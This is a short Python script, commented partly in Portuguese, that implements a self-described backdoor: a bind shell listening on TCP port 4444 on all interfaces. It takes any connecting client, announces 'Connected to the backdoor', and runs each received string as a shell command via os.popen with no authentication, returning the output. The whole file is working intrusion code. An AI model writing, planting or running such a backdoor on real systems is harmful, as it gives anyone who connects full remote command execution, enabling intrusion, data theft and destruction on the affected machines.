# Importing necessary modules
import socket
import os

# Configuring tcp server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = ('', 4444)
server.bind(addr)
server.listen(1)

# Input processing loop
while True:
    print('Aguardando')
    connection, client = server.accept()
    connection.send('\033[1;34m[+] \033[mConnected to the backdoor\n'.encode(encoding='UTF-8'))
    print(f'Conectado a {client}')
    while True:
        connection.send('\n\n\033[1;34m>> \033[m'.encode(encoding='UTF-8'))
        msg = str(connection.recv(1024))
        command = msg[2:len(msg)-3]
        if not msg or command == 'exit':
            connection.send('\033[1;34m[+] \033[mConnection closed.'.encode(encoding='UTF-8'))
            connection.close()
            exit()
        else:
            output = str(os.popen(command).read())
            output = f'\033[1;34mOutput:\033[m\n {output}'.encode(encoding='UTF-8')
            connection.send(output)
connection.close()
